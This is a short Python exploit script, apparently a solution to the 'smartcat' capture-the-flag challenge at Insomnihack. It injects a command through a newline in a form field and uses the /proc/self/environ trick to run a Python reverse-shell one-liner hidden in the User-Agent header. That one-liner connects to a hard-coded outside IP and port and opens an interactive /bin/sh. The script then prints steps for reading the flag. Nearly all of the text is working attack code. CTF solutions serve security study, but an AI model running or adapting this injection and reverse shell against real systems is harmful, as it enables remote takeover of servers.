#!/usr/bin/python

import requests

URL = 'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'

HOST = '52.64.97.221'	# your IP for the reverse shell
PORT = '4443'		# port you're listening on

s = requests.Session()

# Python backdoor in the user-agent with a # at the end
headers = { 'User-Agent' : ';python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("' + HOST + '",' + PORT + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\' #' }

# the old /proc/self/environ trick
payload = { 'dest' : chr(0xa) + 'bash</proc/self/environ'}

print "[*] Exploiting..." 
print "[+] When you get the reverse shell, issue these commands:"
print "[+] cd /home/smartcat"
print "[+] ./readflag"
print "[+] Type \"Give me a...\"<enter>"
print "[+] wait 2 seconds..."
print "[+] Type \"... flag!\"<enter>"
r = s.post(URL, data=payload, headers=headers)


